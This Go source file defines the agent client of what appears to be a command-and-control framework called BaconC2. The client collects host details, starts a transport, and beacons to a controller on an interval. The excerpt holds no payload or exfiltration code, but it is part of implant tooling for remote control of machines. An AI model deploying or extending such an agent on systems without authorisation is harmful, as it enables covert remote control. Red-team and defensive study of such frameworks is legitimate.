package agent

import (
	"log"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
)

type AgentClient struct {
	config          config.AgentConfig
	transport       local_models.ITransportProtocol
	commandExecutor models.ICommandExecutor
	resultsQueue    queue.IResultQueue
	agent           models.Agent
	isRunning       bool
}

func NewAgentClient(cfg config.AgentConfig, tr local_models.ITransportProtocol, commandExecutor models.ICommandExecutor, commandQueue queue.ICommandQueue, resultsQueue queue.IResultQueue) *AgentClient {
	return &AgentClient{
		config:          cfg,
		transport:       tr,
		commandExecutor: commandExecutor,
		resultsQueue:    resultsQueue,
	}
}

func (c *AgentClient) Initialize() error {
	sysInfo, err := sysinfo.GatherMinimalInfo(c.config.Protocol)
	if err != nil {
		log.Printf("Failed to gather minimal system info: %v", err)
	}

	c.agent = models.Agent{
		ID:       c.config.AgentID,
		Hostname: sysInfo.Hostname,
		IP:       sysInfo.IP,
		OS:       sysInfo.OS,
		Protocol: sysInfo.Protocol,
	}

	if err := c.transport.Initialize(c.agent); err != nil {
		return err
	}

	return nil
}

func (c *AgentClient) Start() error {
	if c.isRunning {
		return nil
	}

	c.isRunning = true
	log.Printf("Agent %s started, beaconing every %s", c.agent.ID, c.config.BeaconInterval)
	go c.transport.RunProtocol()

	return nil
}

func (c *AgentClient) Stop() {
	if !c.isRunning {
		return
	}

	c.isRunning = false

	if err := c.transport.Close(); err != nil {
		log.Printf("Error closing transport: %v", err)
	}
}

func getOutboundIP() string {
	return "127.0.0.1" // Placeholder
}
